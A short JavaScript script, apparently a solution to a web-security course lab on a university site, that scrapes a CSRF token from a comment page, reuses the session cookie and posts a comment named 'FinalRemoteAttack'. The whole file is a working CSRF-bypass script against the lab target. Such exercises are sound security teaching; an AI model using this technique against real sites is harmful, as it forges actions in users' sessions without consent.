const url = "https://webappsec.cs.ut.ee/csrf/comments_token.php";
const commentToAdd = "FinalRemoteAttack";

const main = async () => {
    const token = await fetch(url).then((response) => {
        cookie = response.headers.get("set-cookie");
        return response.text();
    }).then((body) => {
        return body.split("csrf_token\" value=\"")[1].split("\">")[0];
    });

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookie
        },
        body: "comment="+commentToAdd+"&csrf_token="+token
    });
};

main();